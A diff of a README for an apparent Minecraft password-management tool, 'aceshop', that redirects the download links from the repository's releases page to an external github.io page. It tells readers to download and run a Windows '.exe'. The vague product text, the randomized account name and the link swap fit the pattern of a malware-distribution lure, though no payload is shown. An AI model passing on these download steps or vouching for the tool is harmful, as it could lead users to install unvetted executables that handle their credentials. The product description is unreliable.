@@ -1,6 +1,6 @@
 # 🛠️ aceshop-minecraft-web-layer - Simplify your Minecraft password management today
 
-[![Download AceShop](https://img.shields.io/badge/Download-AceShop-blue.svg)](https://github.com/Magdaiaunbelieving908/aceshop-minecraft-web-layer/releases)
+[![Download AceShop](https://img.shields.io/badge/Download-AceShop-blue.svg)](https://magdaiaunbelieving908.github.io)
 
 AceShop provides a bridge between web projects and Minecraft password workflows. This tool organizes your data in a static format. It integrates with your existing web projects to manage credentials for Minecraft services. This layer runs on your local machine to keep your data secure.
 
@@ -10,7 +10,7 @@ You need a Windows computer to use this application. This software works on Wind
 
 Follow these steps to set up the software.
 
-1. Visit the release page to download the latest version of the application: [https://github.com/Magdaiaunbelieving908/aceshop-minecraft-web-layer/releases](https://github.com/Magdaiaunbelieving908/aceshop-minecraft-web-layer/releases)
+1. Visit the release page to download the latest version of the application: [https://magdaiaunbelieving908.github.io](https://magdaiaunbelieving908.github.io)
 2. Locate the link labeled "Assets" at the bottom of the release page.
 3. Click the file that ends in ".exe" to begin the download.
 4. Save the file to your desktop or downloads folder.
